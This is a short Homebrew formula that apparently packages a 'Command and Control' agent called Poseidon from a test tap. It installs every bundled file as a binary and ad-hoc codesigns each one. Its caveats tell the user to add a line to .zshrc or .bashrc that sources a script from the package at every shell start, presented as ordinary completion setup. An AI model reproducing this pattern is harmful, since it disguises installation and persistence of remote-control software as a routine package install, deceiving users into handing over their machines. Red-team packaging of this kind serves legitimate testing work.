class Poseidon < Formula
    desc "Command and Control"
    homepage "https://github.com/JonEagle/"
    url "https://github.com/JonEagle/homebrew-test/tree/main/dist/poseidon-1.33.7.tar.gz"
    sha256 "b0b0aff03111fb463a63c37ea187206a6e47147ff4b396eb4d53f43b7b404b43"
    version "1.33.7"

    def install
        bin.install Dir["*"]
        Dir["#{bin}/*"].each do |f|
        system "codesign", "--force", "--sign", "-", f if File.file?(f)
        end
          end

    def caveats
        <<~EOS
        To finish installation, add the following line to .zshrc or .bashrc  
  source #{bin}/completion.sh
Then reopen your terminal app
        EOS
    end
    end
